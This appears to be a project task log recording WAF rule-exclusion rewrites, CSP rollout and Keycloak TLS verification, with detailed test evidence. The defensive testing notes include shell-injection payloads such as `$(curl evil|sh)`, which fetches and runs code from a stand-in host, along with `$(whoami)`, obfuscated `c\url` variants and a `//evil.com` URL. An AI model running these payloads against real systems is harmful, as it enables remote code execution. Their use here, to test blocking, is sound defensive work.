      | config | realistic student chat passing | attack payloads blocked |
      |---|---|---|
      | before T4.2.4 | 4 / 7 | 9 / 9 |
      | plain exclusion (rejected) | 7 / 7 | **7 / 9** |
      | **shipped (exclusion + `id:199140`)** | **7 / 7** | **9 / 9** |
      **Scoping fix caught during implementation:** `id:199140` was first written as a bare
      startup-time `SecRule`, which would have applied to every `/api/*` route carrying a `message`
      body field — broader than the hole it fills, and a new FP surface where 932130 is still active.
      Rewritten as a 3-level chain on the same `REQUEST_URI`+`REQUEST_METHOD` pair as `id:199110`, so
      the compensating control is exactly co-extensive with the exclusion. Verified both directions:
      fires on `exam-review-chat`, and on `POST /api/categories` with an identical `message` field it
      does **not** fire while `932130` still blocks (403, `932130 932200 932220 932235 932236 932250`).
      **Evasions tried against the shipped config, all still blocked:** `$(c\url ...|sh)`, `$($(id))`,
      a newline-split substitution. **Residual risks, measured:** `$ (curl x)` with a literal space is
      no longer matched by shape — not command substitution in any shell, and this text reaches an LLM
      and parameterized ORM writes, never a shell; the other 46 `932xxx` rules including `932160` stay
      active on the field. `$(10)` written as a price trips `id:199140`, but it also 403'd before this
      change, so no regression. Bonus FP fixed: `Given $A[i]$ (the i-th row)` now passes.
      **Rejected alternatives, recorded so they are not re-litigated:** `ctl:ruleRemoveByTag=attack-rce`
      (BR-WAF-005; would strip `932160`, which does most of the remaining work here); a route-level
      anomaly-threshold raise (BR-WAF-006); `SecRuleUpdateActionById` to drop `t:cmdLine` from 932130
      (defeats `c\at`/`c^at` evasion handling platform-wide to fix two routes); an application-layer
      fix (BR-WAF-009 does not apply — the message is genuinely user-authored and cannot be
      reconstructed server-side, and that BR's own carve-out sanctions one narrow exclusion on a single
      named field); and "wait for more soak data", which the user closed out — the dev-stack UI soak
      plus these matrices were accepted as sufficient.
      Verified against the **real edited file** on an isolated `waf-harness.sh` stack (`v2026.6`,
      enforce mode, soak pairs stripped), not a scratchpad reconstruction. T4.2.1/T4.2.2/T4.2.3's
      checks all re-run and still hold. Reloaded onto `apisix-dev`, zero init errors, no container
      restarted. `jq` valid. Left **uncommitted** with T4.2.1's edit for user review. The
      `GATEWAY_IMAGE_TAG` ≥ `v2026.6` ship gate still applies.
      **Note on sequencing:** while `id:199130`'s DetectionOnly soak is in place, `id:199140` is
      detection-only on these URIs too. It begins blocking when that soak is lifted — recorded in-file.)
- [x] **G4.2: hAITU and topic-content-edit endpoints protected and false-positive-free** — integration test
      (2026-08-04; **closed on T4.2.5 — enforcement confirmed live, on real authenticated browser
      traffic, not just the harness.** T4.2.5's soak removal is the acceptance evidence:
      - **False-positive-free, real UI, all 5 URI+method pairs:** the user drove a full walkthrough on
        `apisix-dev` (gateway `v2026.6`) through the actual frontend, not curl — hAITU topic-doubt and
        exam-review-chat (4 T4.1.2 corpus messages each, including the OCR'd-LaTeX-MCQ and chemistry
        patterns), topic-content PATCH admin + parent mirror, topic-content POST create admin + parent
        mirror. Every request read back by `request_id` against the live Coraza log, not assumed clean.
        Zero false positives anywhere. One self-caught methodology bug worth recording: an early manual
        test payload had `\frac` unescaped in raw JSON, which parses as `\f` (form-feed) — correctly
        tripped `920271` (non-printable character) as a test-construction artifact, not a real finding;
        caught by inspecting the actual bytes sent, corrected, retested clean.
      - **Protected, confirmed enforcing not just logging:** with the three `DetectionOnly` soak pairs
        removed, the same attack payloads that logged during soak now return real **403**s: two
        independent hAITU attempts (`$(curl evil|sh)` → blocked by pre-existing `931130`/RFI since it
        contained a URL; `$(whoami)` → blocked by pre-existing `932260`, a command-name keyword rule
        neither T4.2.1 nor T4.2.4 had accounted for) plus two topic-content attempts (parent POST →
        blocked by `932200`/`932220`/`932235`/`932236`/`932250`, `932130` correctly absent). Because
        `tx.early_blocking=1` denies as soon as any rule crosses threshold, and native CRS rules
        evaluate before this file's custom-appended ones, none of these four isolate `id:199140`'s own
        deny action — they show the net outcome is correct, not that the new rule specifically works.
        A fifth, deliberately constructed test closed that gap: `$(xyzq)` — no real command name, no
        URL, dodges every other active `932xxx` rule by construction, predicted on the harness to be
        caught by `id:199140` alone, then sent for real. Live log: `"Coraza: Access denied (phase 2)...
        [id "199140"]"`, no other rule ID present. `id:199140` itself confirmed blocking on live
        traffic, isolated from the surrounding coverage.
      - **Bugfix found and fixed during this pass, cosmetic only:** `id:199140`'s `capture` action was
        on the wrong sub-rule in its chain (`REQUEST_URI`, rule 1) instead of the `ARGS_POST` match
        (rule 3), so `logdata`'s `%{TX.0}` was reporting the request URI instead of the actual matched
        shell expression — confirmed live before the fix (`Matched Data: /api/haitu/topic-doubt found
        within ARGS_POST:json.message`). Moved `capture` to rule 3. Does not affect blocking — verified
        live both before and after, `id:199140` denied correctly in both cases — only log readability
        for whoever reads this rule's alerts later.
      - **Two live operational quirks found and worth recording, not part of this gate's scope:** (1)
        the first hAITU attack test showed zero Coraza log lines despite the payload persisting
        byte-identical in the DB — traced to `apisix-dev` running long enough, hot-reloaded enough
        times, that at least one nginx worker held a stale Coraza WASM VM; re-pushing the identical
        plugin_config resolved it. (2) separately, the agent misread live logs as "still silent" on
        two later occasions when the true cause was pulling `docker logs --since` before the lines had
        flushed — re-checking against the full log (no `--since` window) showed the rules had fired
        correctly all along. Recorded so neither is mistaken for a WAF defect on a future pass.
      Committed by the user directly (own git identity, outside this session) as `aa553a9`
      ("fix(waf): refine rule exclusions and enhance field-scoping for topic-content edits"),
      confirmed on `haisir-deploy` — content verified byte-identical to what T4.2.1/T4.2.4/T4.2.5
      built (2 blanket `ctl:ruleRemoveById` survivors, 0 live `DetectionOnly`, `id:199140` present
      with `capture` correctly on its `ARGS_POST` sub-rule). Deploy baseline bumped below.
      Held open earlier 2026-08-03/04 on two separate grounds, both since resolved: first because
      "false-positive-free" wasn't met (T4.2.4's own task note above has that evidence — an isolated
      harness A/B on the OCR'd-MCQ cross-route inconsistency, closed by adding `932130` plus the
      `id:199140` compensating rule); then because these URIs were still under
      `ctl:ruleEngine=DetectionOnly` so "protected" wasn't proven on the live deployment, only on the
      harness (closed by this task's own evidence above). See the superseded note below, kept for the
      historical record of the first, now-outdated closure attempt.)
- [x] T4.2.5 [deploy]: Remove the `id:199130`/`id:199131`/`id:199132` `ctl:ruleEngine=DetectionOnly`
      soak blocks from `03-secured-api.json`, restoring enforcement on the hAITU and topic-content
      URIs (depends on T4.2.4) — the in-file comment already says to remove all three at this point.
      Do this only once T4.2.1/T4.2.4's changes have been deployed and observed on a real environment
      with a `GATEWAY_IMAGE_TAG` ≥ `v2026.6`, per BR-WAF-011. (2026-08-04; **user explicitly overrode
      the "wait for a release" reading of this precondition** — `apisix-dev` already runs
      `GATEWAY_IMAGE_TAG=v2026.6` and carries T4.2.1/T4.2.4's uncommitted changes, so it independently
      satisfies BR-WAF-011's "real environment ... ≥ v2026.6" language without a staging/prod release;
      the user directed treating a live-browser dev-stack walkthrough as the real-traffic evidence,
      consistent with the same substitution T4.1.2 used and the user explicitly approved there. All
      three `SecRule` pairs (`id:199130`/`199131`/`199132`) and their justification block deleted from
      `03-secured-api.json`, replaced with a summary comment recording the soak evidence and pointing
      at TASKS.md. Reloaded onto `apisix-dev` (`template-configs.sh` + `setup.sh --plugins-only`,
      double-pushed after the stale-WASM-VM finding below). Full verification detail is in G4.2's task
      note above, since this task's removal is literally what made that gate's live-enforcement
      evidence possible — summary: 2 hAITU real-attack 403s (credited to pre-existing `931130`/`932260`
      rather than the new rule, due to `tx.early_blocking` + native-rule evaluation order), 2
      topic-content real-attack 403s (parent POST, all five expected RCE rules, `932130` absent), and
      one deliberately isolating payload (`$(xyzq)`) that got `id:199140` blocking on its own,
      confirmed by log ("Access denied (phase 2)... [id "199140"]", no other rule present). Also
      fixed a cosmetic `capture`-placement bug on `id:199140` found while reading these logs (moved to
      the `ARGS_POST` sub-rule so `%{TX.0}` reports the actual match instead of the request URI;
      doesn't affect blocking, verified live both before and after). `jq` valid. Left **uncommitted**
      with T4.2.1/T4.2.4, same WAF-edit review norm — the whole `id:199100`→`id:199140` chain of edits
      ships as one review, one commit, one release.)
- [ ] ~~**G4.2 superseded note, 2026-08-03 (earlier same day)**~~ — **NOT closed despite T4.2.1–T4.2.3
      all being done.** "Protected" is met: the
      exclusions are field-scoped, headers/cookies/query args are demonstrably inspected, libinjection
      is active even on excluded fields, and attacks on unrelated `/api/*` routes still 403 with the
      full rule set. **"False-positive-free" is not met**, on a real and reproducible case found while
      verifying T4.2.3. Identical OCR'd LaTeX + MCQ content — `Convert $28\frac{4}{5}\%$ to a ratio.
      (a) $16:125$ (b) $16:25$ (c) $4:25$ (d) $2:5$` — behaves inconsistently across sibling routes:
      | route | result |
      |---|---|
      | `PATCH /api/topics-contents/{id}` (`id:199120` excludes `932130`) | **200**, only warning-level `942430` |
      | `POST /api/haitu/topic-doubt` (`id:199110` does not) | **403** `932130` |
      | `POST /api/haitu/exam-review-chat` (`id:199110` does not) | **403** `932130` |
      `932130` matches shell command substitution on the literal `$(b)` shape, which OCR'd
      multiple-choice options produce (`$16:125$ (b)`). A student pasting an exam question into
      topic-doubt — the endpoint's entire purpose — gets a 403. This is **pre-existing, not caused by
      T4.2.1**: the old blanket list did not include `932130` either, so the behaviour is unchanged;
      the field-scoped rewrite merely made it visible by giving these routes a first systematic
      cross-route comparison. Tracked as **T4.2.4**. The fix is a one-line addition of `932130` to
      `id:199110`'s list with the same justification `id:199120` already carries, but per
      `feedback_waf_challenger_review` it needs an adversarial pass before landing, so it is not being
      slipped into a verification task. **G4 stays open on G4.2.** *(Superseded the same day — T4.2.4
      landed and G4.2 closed above. The "one-line addition" prescription in this note was itself wrong:
      see T4.2.4 for why the bare exclusion was measured and rejected.)*

### G4.3 [deploy]: Reclaim the exam authoring route
> **Do not delete this route's field-scoped exclusions.** `12-api-exams-static.json` uses
> `SecRuleUpdateTargetByTag <tag> "!ARGS_POST:/field/"`, which narrows one tag's scope by one named
> field — the target-state pattern, not the blanket removal seen on `199110`. Only the four
> `image_url` exclusions are obsoleted by G3.5. The exclusions on `question_text`, `explanation`,
> `model_answer`, `.text`, `json.description` and `correct_answers` address real, unrelated false
> positives in science prose, mathematical notation and quoted text and **must be preserved**.
- [x] T4.3.1 [deploy]: Remove only the four `image_url` exclusions (`ATTACK-RCE`, `ATTACK-GENERIC`, `ATTACK-XSS`, `ATTACK-SQLI`) now that images are URL references; leave every other field exclusion in place (depends on T3.5.4 [frontend]) (2026-08-01; removed the 4 `SecRuleUpdateTargetByTag ... !ARGS_POST:/image_url/` directives plus their base64-image justification comment block from `common/routes/12-api-exams-static.json`; every other field exclusion (`question_text`, `explanation`, `model_answer`, `.text`, `json.description`, `correct_answers`, `932271`, `920420`, session-cookie rules) left untouched, per G4.3's explicit "do not delete" warning. `jq` valid; grepped the file post-edit to confirm no `image_url` directive remains. Left **uncommitted** in the working tree for user review, per this repo's established norm for WAF exclusion edits.)
- [x] T4.3.2 [deploy]: Restore `inbound_anomaly_score_threshold` from 12 to the platform default of 5 (`id:199101`) per BR-WAF-006 (depends on T4.3.1) (2026-08-02; `id:199101`'s `setvar:tx.inbound_anomaly_score_threshold` `12` → `5` in `common/routes/12-api-exams-static.json`; `outbound_anomaly_score_threshold=4` untouched, not in scope. `jq` valid. Left uncommitted with T4.3.1/T4.3.3, same WAF-edit review norm.)
- [x] T4.3.3 [deploy]: Restore `id:199104` in `12-api-exams-static.json` to the platform defaults now that base64 image arguments are gone — the platform baseline is `id:199004`, identical across all seven configs that set it: `max_file_size=1048576`, `combined_file_sizes=1048576`, `max_num_args=512`, `arg_name_length=256`, `arg_length=4096`, `total_arg_length=65535`. Current raised values to be retired: `max_file_size=52428800`, `combined_file_sizes=104857600`, `max_num_args=2000`, `arg_length=52428800`, `total_arg_length=104857600`. Also drop the separate `id:199110` `max_num_args=2000` SecAction at `:39` in this same file — it re-raises what this task lowers (depends on T4.3.1) (2026-08-02; `id:199104` restored to the exact platform-baseline `tx.*` values listed above (added `arg_name_length=256`, previously unset on this route entirely); the separate `id:199110` `SecAction` re-raising `max_num_args=2000` deleted outright. `SecRequestBodyLimit`/`SecRequestBodyNoFilesLimit` (100MB, a different directive, not part of `id:199104`'s `tx.*` vars) deliberately left untouched — still needed for legitimate PDF/large uploads and not named by this task. `jq` valid.)
- [x] T4.3.4 [deploy]: Confirm the surviving field exclusions still suppress their original false positives at anomaly threshold 5 — the threshold raise may have been masking cases the field exclusions alone do not cover (depends on T4.3.2) (2026-08-02; verified live against a real gateway image (`registry.haisir.in/haisir-gateway:v2026.6`, same build already gated at T2.3.2/T1.3.4) via a disposable isolated stack — adapted `common/scripts/tests/waf-harness.sh`'s pattern (throwaway etcd+upstream+APISIX, non-secret placeholder admin key, fully torn down after) rather than touching the real `apisix-dev`/OpenBao secrets, since this route needs no OIDC token to reach Coraza's body-phase rules and the harness avoids all real-secret handling. Loaded `12-api-exams-static.json`'s exact post-T4.3.2/T4.3.3 route-level `coraza-filter` config. **12/12 checks passed:** each surviving exclusion's original false-positive example (question_text math/units, explanation rhyme-scheme + tilde `~100` + PHP-like `system(`, model_answer essay prose, `options[].text` 'cat / dog', correct_answers mixed numbers) individually passes (200) at threshold 5; **all of them combined in one request also passes (200)** — the specific case this task exists to check, proving threshold 12 wasn't masking a multi-rule score that tips over 5 once lowered; `image_url` (exclusion removed by T4.3.1) now correctly blocks a real XSS payload (403) while a plain benign URL still passes (200); a real SQLi/XSS payload on an unexcluded field is still blocked (403), confirming the lowered threshold didn't weaken unrelated protection. Script kept at the session scratchpad, not committed to the repo — this was a one-off verification run, not a reusable test suite addition.)
- [x] **G4.3: exam authoring route back to platform-default thresholds with field exclusions intact** — integration test (2026-08-02; T4.3.1–T4.3.4 all done — T4.3.4's live harness run above is this gate's own integration test: threshold restored to 5, surviving field exclusions demonstrably still suppress their false positives (individually and combined), the four obsolete `image_url` exclusions are gone and that field is now genuinely protected, and unrelated attack payloads are unaffected.)

### G4.4 [deploy]: Unambiguous route matching
- [x] T4.4.1 [deploy]: Raise the exact-URI routes `21-api-haitu-exam-review.json` and `22-api-haitu-pattern-analysis.json` above `19-api-haitu.json`'s `/api/haitu/*` per BR-WAF-012 (2026-08-02; both routes `priority: 20 → 30`, clear of route 19's wildcard (priority 20) and route 18 (21). `desc` updated to cite BR-WAF-012 and the strict-schema-enforcement rationale. Route 23 (`/api/haitu/exam-review-chat/*`) untouched — GET-only, no POST collision with route 19. `jq` valid both files. Left **uncommitted** in the working tree for user review, per this repo's established norm for G4 WAF/route edits.)
- [x] T4.4.2 [deploy]: Verify the intended `body_schema` is the one actually enforced (depends on T4.4.1) (2026-08-02; **verified 4/4 against a disposable isolated APISIX stack** — throwaway etcd + stock `apache/apisix:3.17.0-ubuntu` on a distinct network (127.0.0.1-bound ports, torn down after), adapted `waf-harness.sh`'s pattern, no dev stack / no secrets / no custom gateway image (`request-validation` is a core plugin). Loaded the three real working-tree route JSONs (stripped of `plugin_config_id` + `id` so OIDC/ua-restriction/coraza don't mask the schema signal; neither field affects URI/method/priority matching). Probes: (1) `POST /api/haitu/exam-review-chat {}` → **400** carrying route 21's exact `rejected_msg` ("...body must include attempt_id (UUID) and message (string)") — route 21's strict schema won; (2) `POST /api/haitu/pattern-analysis {}` → **400** carrying route 22's `rejected_msg` ("...body must include attempt_id (UUID)") — route 22 won; (3) `POST /api/haitu/topic-doubt {}` → **503** (only route 19 matches; loose schema passes; absent upstream) — control: route 19 still owns the rest of `/api/haitu/*`; (4) valid body → 503 (strict schema accepts valid input, then proxy fails). Routes 21/22 (priority 30) demonstrably outrank route 19 (priority 20). **The verification caught and fixed a real deployment-breaking bug in T4.4.1's own edit:** the lengthened `desc` field on routes 21/22 was 404 chars, over APISIX's 256-char `desc` limit, so the admin API rejected the route PUTs (`"invalid configuration: property \"desc\" validation failed: string too long, expected at most 256, got 404"`) — the routes would have silently failed to load in staging/prod and fallen through to route 19's loose schema, the exact failure BR-WAF-012 exists to prevent. Corrected both `desc` fields to ≤256 chars (233/216) keeping the BR-WAF-012 rationale. Script kept at the session scratchpad, not committed (T4.3.4 one-off precedent). All three route files `jq`-valid; left **uncommitted** with T4.4.1/T4.5.1/T4.5.3, same G4 review norm.)
- [x] **G4.4: route precedence explicit** — integration test (2026-08-02; T4.4.1 + T4.4.2 both done — T4.4.2's 4/4 disposable-harness run above IS this gate's integration test: the strict `body_schema` on routes 21/22 is the one actually enforced, route 19's wildcard no longer tie-breaks, and the deployment-breaking `desc`-length bug the verification surfaced is fixed.)

### G4.5 [deploy]: Exclusion hygiene
- [x] T4.5.1 [deploy]: Correct the `id:199100` `931130` justification in `03-secured-api.json` — it still says the topic-content URL allowlist is "tracked in backend task"; it shipped (https-only + hostname allowlist, rejects protocol-relative `//evil.com`), per BR-WAF-008. `id:199121` (the parent-route mirror added 2026-07-29) already carries a correct, complete justification — no fix needed there, verify only (2026-08-02; `id:199100`'s `RESIDUAL RISK` comment in `03-secured-api.json` rewritten from "(tracked in backend task: validate_topic_content_url)" to "IMPLEMENTED in the backend create-side validator — https-only scheme plus hostname allowlist, rejects protocol-relative '//evil.com'; the PATCH-side parity gap is tracked in T4.5.2 [backend]". `id:199121` re-verified — its justification already states the shipped control correctly, no "tracked in backend task" stale text, **no change**. Comment-only edit, `jq` valid. Left **uncommitted** with T4.4.1, same G4 review norm.)
- [x] T4.5.2 [backend]: Close the related gap — `TopicContentUpdate.validate_url` enforces scheme + allowlist but not the "external URLs only for `content_type == video`" rule that create applies, so PATCH can attach an allowlisted external URL to a `pdf`/`text` item (2026-08-03; **no production code change needed** — the gap was already functionally closed at the service layer by `TopicContentService._normalize_update_url` (raises `ValueError` for an external URL on a non-video row, since commit `c24d17e` 2026-07-10), wired through both PATCH routes (`PATCH /api/topics-contents/{id}` admin, `PATCH /api/parent/curriculum/topic-contents/{id}` parent) which map it to HTTP 400. The schema `TopicContentUpdate` structurally cannot enforce the content_type rule — `content_type` is deliberately excluded (immutable after creation) — so the service is the correct and only enforcer for PATCH, mirroring how create's service trusts its own schema. Verified there is no third PATCH/update path accepting a user-supplied url that bypasses `_normalize_update_url`. The actual work was locking the regression: the existing route tests mocked the entire service (`side_effect=ValueError`), so they would still pass if the guard were deleted. Added real-service-through-real-route regression tests (parametrized over pdf/image/text/question/question_answer → 400 "video" with repo write not awaited; video → 200 verbatim; local path on non-video → 200 normalized) plus a parent PATCH wrong-role 403 test. Sanity-verified: disabling the `content_type != video` branch made all rejection tests fail (200 instead of 400); restored. Committed 2026-08-03 as `e2e0f0f` (`test(topic-content): lock PATCH external-URL enforcement end-to-end (T4.5.2)`) and pushed to `origin/main`; full suite 4983 passed, coverage 100%.)
- [x] T4.5.3 [deploy]: Re-scope or delete the remaining exclusions on `18-api-exam-session-submit.json` and the `01`/`02`/`04` plugin configs to field-scoped form per BR-WAF-004 (2026-08-02; **no file edit required — all four files already comply with BR-WAF-004.** Verified by exhaustive grep: `ctl:ruleRemoveById` (the prohibited whole-rule/whole-request form) = **0** in `18-api-exam-session-submit.json`, `01-secured-authenticated.json`, `02-secured-anonymous.json`, `04-secured-api-upload.json`. Every exclusion is the startup-time field-scoped form BR-WAF-004 prescribes — `SecRuleUpdateTargetById <id> !REQUEST_COOKIES:<name>`/`!ARGS_GET:<name>`/`!REQUEST_HEADERS:<name>` (01/02/04, 17–18 each) and `SecRuleUpdateTargetByTag <tag> "!ARGS_POST:/<field>/"` (route 18, text_answer/working_text). Every exclusion carries a written justification (BR-WAF-007); none reference a shipped-but-unretired compensating control (BR-WAF-008 — the only stale one, `id:199100`'s 931130, is T4.5.1's, in `03` not in scope here). Route 18's `id:199204` body-limit raises (`arg_length=32768`, `total_arg_length=524288`) are justified body limits for essay `text_answer`, not rule exclusions — retained. The deliverable is the verification, not a fabricated edit; G4.5's "field-scoped" half is satisfied for these files, leaving only T4.5.2 [backend] before G4.5 can close.)
- [x] **G4.5: every surviving exclusion is field-scoped and truthfully justified** — acceptance test (2026-08-03; all three children done — T4.5.1 corrected the stale `931130` justification in `03-secured-api.json`, T4.5.3 verified `18`/`01`/`02`/`04` already comply with BR-WAF-004 (all exclusions field-scoped `SecRuleUpdateTarget*`, zero `ctl:ruleRemoveById`, every exclusion justified), T4.5.2 closed the backend PATCH-side URL-allowlist parity gap. Every surviving exclusion is field-scoped and carries a truthful justification per BR-WAF-007/BR-WAF-008; no stale "tracked in backend task" text remains. G4 itself stays open on G4.1/T4.1.2 soak and G4.2/T4.2.1.)

- [x] **G4: Exclusions rewritten field-scoped or deleted** — integration test (2026-08-04; all five
      children done — G4.1 (soak evidence), G4.2 (protected + false-positive-free, confirmed on real
      live enforce-mode traffic), G4.3 (exam-authoring thresholds restored), G4.4 (route precedence
      explicit), G4.5 (every surviving exclusion field-scoped and truthfully justified). Net result in
      `03-secured-api.json`: whole-request `ctl:ruleRemoveById` count **57 → 2**, both survivors
      (`931130` on `id:199100`/`id:199121`) structurally unscopeable — they inspect a CRS-internal TX
      variable, not `ARGS` — and both carry a written, current justification per BR-WAF-007/008. Every
      other exclusion across all four plugin configs is field-scoped `SecRuleUpdateTarget*` or
      request-scoped `ctl:ruleRemoveTargetById=<id>;<COLLECTION>:/regex/`, chained on a specific
      URI+method pair rather than applying platform-wide, and — as of T4.2.5 — genuinely enforcing
      rather than logging-only. This closes Phase 7's core WAF-hygiene goal; G3 (payload design) and
      the CVE/version-upgrade work in G1/G2 were the other legs, already closed earlier in this phase.)

## G5 [frontend]: CSP enforced

### G5.1 [frontend]: Working report collector
- [x] T5.1.1 [frontend]: `src/app/csp-report/route.ts` currently reads the body and discards it — persist reports via structlog per BR-CSP-008, keeping the 204 response (2026-07-29)
- [x] T5.1.2 [frontend]: Verify reports surface where they can actually be read during the soak (depends on T5.1.1) (2026-07-29)
- [x] **G5.1: violations are captured** — integration test (2026-07-29; collector persists a posted report as a structured greppable JSON line on every input branch — locked by `tests/unit/app/csp-report-route.test.ts`, 100% coverage; hardened 2026-07-29 in `eb21350`, BR-CSP-008 — unbounded `request.text()` replaced with a 64 KiB-capped streaming read so an oversized/malicious report can't exhaust memory or flood the log)

### G5.2 [frontend]: Nonce CSP in proxy.ts
- [x] T5.2.1 [frontend]: Extend the existing `src/proxy.ts` — mint a per-request nonce, set `Content-Security-Policy-Report-Only`, forward `x-nonce` on request headers (the file exists and holds the onboarding guards; extend, do not replace)
- [x] T5.2.2 [frontend]: Derive `frame-src` from the backend `allowed_video_hostnames` allowlist per BR-CSP-005 rather than hardcoding a second copy (depends on T5.2.1)
- [x] T5.2.3 [frontend]: Confirm `worker-src 'self' blob:` covers pdf.js and whether the build needs `'wasm-unsafe-eval'` (depends on T5.2.1)
- [x] T5.2.4 [frontend]: Confirm `react-pdf.css` and `globals.css` inject nothing at runtime that the nonce will not cover (depends on T5.2.1)
- [x] T5.2.5 [frontend]: Add the prefetch `missing:` filter to the proxy matcher per the Next.js CSP guidance (depends on T5.2.1)
- [x] T5.2.6 [frontend]: Opt the **12 pages lacking `force-dynamic`** into dynamic rendering per BR-CSP-010 — 15 of 27 have it, 12 do not (7 server components, 5 `"use client"`), including all of `/onboarding/*` and `/admin/*`. A statically prerendered page cannot receive a nonce, so a strict `script-src` blocks its framework scripts. Verify by inspecting the build manifest for statically-prerendered routes, not by grep alone (depends on T5.2.1)
- [x] T5.2.7 [frontend]: Add a CI assertion that no new HTML route is statically prerendered, per BR-CSP-010 — this breaks silently in production rather than at build (depends on T5.2.6)
- [x] **G5.2: Report-Only CSP live with nonces applied on every route** — integration test (2026-07-31; T5.2.1–T5.2.7 all done — nonce minted per request, `frame-src`/`worker-src` derived correctly, prefetch filter added, and T5.2.6/T5.2.7 confirmed every route opts into dynamic rendering (verified via the build manifest, not just grep) with a CI assertion guarding against regression — so every route can actually receive a nonce)

### G5.3 [frontend]: Soak
- [x] T5.3.1 [frontend]: Exercise every journey — login, onboarding, exam authoring with image upload, exam taking, review chat, PDF viewing, video viewing, parent curriculum, admin (depends on T5.2.5) (2026-07-30; CI soak shipped — tests/e2e/g5-csp-soak.spec.ts + helpers/csp.ts, 20 journeys green; image-upload interaction, PDF-worker runtime and the full live-stack soak flagged to deploy)
- [ ] T5.3.2 [frontend]: Include the Keycloak OIDC round-trip — `07`/`08`/`09-auth-*` routes are APISIX-owned and redirect cross-origin, exercising `form-action` and navigation (depends on T5.3.1) (NOT frontend-runnable — 07/08/09-auth-* are APISIX-owned cross-origin with no src/ routes; deploy-owned live-stack soak. T5.4.1 enforcement MUST NOT proceed until this passes per BR-CSP-007)
- [x] T5.3.3 [frontend]: Review collected reports and adjust directives (depends on T5.3.2) (2026-07-30; CI soak finding = zero unexplained violations in the scoped directive set, no directive adjustments. Real-production report review incl. the OIDC round-trip is deploy-owned per BR-CSP-007 — T5.4.1 enforcement MUST NOT be unblocked until the deploy soak passes)
- [ ] **G5.3: zero unexplained violations across all journeys** — acceptance test

### G5.4 [frontend]: Enforce
- [ ] T5.4.1 [frontend]: Switch to the enforcing header name, keeping `report-uri` live per BR-CSP-009 (depends on T5.3.3)
- [ ] T5.4.2 [frontend]: Negative test — an injected inline script is blocked (depends on T5.4.1)
- [ ] **G5.4: CSP enforced** — end-to-end test

- [ ] **G5: CSP enforced** — end-to-end test

## G6 [backend, deploy]: Auth and transport verification

### G6.1 [deploy, backend]: TLS verification on Keycloak channels
- [x] T6.1.1 [deploy]: Remove `OAUTH__KEYCLOAK__SSL_VERIFY=false` from `prod/.env:39` and `staging/.env:39`; the code default is already `true` (BR-SEC-021) (2026-07-29)
- [x] T6.1.2 [deploy]: Trust the internal CA in the backend image so self-signed Keycloak certs validate rather than being bypassed (depends on T6.1.1) (2026-07-31; deploy doesn't own the backend Dockerfile, so implemented as a runtime trust mount instead of an image rebuild: new external volume `haisir-backend-ca-cert` (holds only `ca.pem`, the same CA that signs Keycloak's cert) mounted read-only at `/certs` in both `backend` and `worker` (`common/docker-compose.yml`), `REQUESTS_CA_BUNDLE`/`SSL_CERT_FILE` env vars point at it. `env-setup.sh` uploads `ca.pem` into the volume, added to `REQUIRED_VOLUMES`. Manual step (user completed live): `export BACKEND_CA_CERT_VOLUME="haisir-backend-ca-cert"` added to dev/staging/prod `.env.config.sh`. T6.1.3/T6.1.4 (backend repo) still needed before this has an effect — trust alone doesn't remove the `CERT_NONE` bypass.)
- [x] T6.1.3 [backend]: Remove or gate the `check_hostname = False` / `CERT_NONE` context in `src/auth/user.py:37-42` so production cannot silently reach it (depends on T6.1.2) (2026-07-31; verified already correctly gated — `ssl_context` is only built `if not settings.oauth.keycloak.ssl_verify and url.startswith("https://")`, otherwise `None` (real cert verification via `PyJWKClient`'s default `ssl_context`). No `src/` change needed at this task; commit `394f1b2` added `TestSSLContext.test_ssl_context_none_when_ssl_verify_true`/`test_ssl_context_none_when_url_is_http` locking the behavior in. Production is now safe end-to-end: T6.1.1 removed the prod/staging `ssl_verify=false` override (code default `true`), T6.1.2 mounts the internal CA so the resulting real verification actually succeeds against Keycloak's self-signed cert.)
- [x] T6.1.4 [backend]: Verify introspection and Keycloak-admin calls succeed with verification on (depends on T6.1.3) (2026-07-31; confirmed `verify=self._ssl_verify` already passed to `httpx.AsyncClient` at all 5 call sites — `infrastructure/token_introspection.py:107` and `infrastructure/keycloak_admin.py:87,135,181,207`. Commit `394f1b2` added regression tests (`test_keycloak_admin.py::TestSslVerifyPassthrough`, `test_token_introspection.py::TestSslVerifyPassthrough`) asserting `AsyncClient(verify=True)` when `ssl_verify=True` and `verify=False` in dev — proves the config flag actually reaches the HTTP layer instead of being silently ignored.)
- [x] **G6.1: BR-SEC-021 — no unverified TLS to Keycloak** — integration test (2026-07-31; T6.1.1–T6.1.4 all done — prod/staging default to `ssl_verify=true`, internal CA trusted via the mounted volume, the JWKS `ssl_context` and both httpx clients (introspection, Keycloak-admin) all honor the flag, all now regression-tested)

### G6.2 [backend]: JWT audience validation
- [x] T6.2.1 [backend]: Confirm APISIX-injected tokens actually carry the `haisir-backend-admin` audience before enforcing — enabling this blind will 401 every request (2026-07-30)
- [x] T6.2.2 [backend]: Set `verify_aud: True` with the expected audience in `src/auth/user.py:73` (BR-SEC-020) (depends on T6.2.1) (2026-07-31)
- [x] T6.2.3 [backend]: Regression test — a token minted for a different realm client is rejected with 401 (depends on T6.2.2) (2026-07-31) — satisfied by `test_invalid_audience_raises_401` added under T6.2.2
- [x] **G6.2: BR-SEC-020 — audience confusion closed** — integration test (2026-07-31; T6.2.1–T6.2.3 all done — `verify_aud: True` enforced against the confirmed `haisir-backend-admin` audience, and `test_invalid_audience_raises_401` (added under T6.2.2) is the regression test T6.2.3 called for: a token minted for a different realm client is rejected 401)

### G6.3 [deploy]: Internal TLS verification
- [x] T6.3.1 [deploy]: Enable `openid-connect.ssl_verify` in `03-secured-api.json:450`, `01-secured-authenticated.json:308`, `04-secured-api-upload.json:311` (M5) — line numbers re-verified 2026-07-29; Phase 6.5's WAF commit shifted all three (`03` by +43, `01`/`04` by +3), so the originally-scoped `407`/`305`/`308` are stale (2026-07-31; `ssl_verify: false → true` in all three. Pre-flight check: APISIX had no `lua_ssl_trusted_certificate` set anywhere, so flipping this blind would have broken every OIDC login against Keycloak's self-signed cert — added `nginx_config.http.lua_ssl_trusted_certificate: /usr/local/apisix/certs/ca.pem` to `common/apisix_conf/config.yaml` (the cert is already mounted into the APISIX container for etcd TLS, no new volume needed). `jq`/`yamllint` valid.)
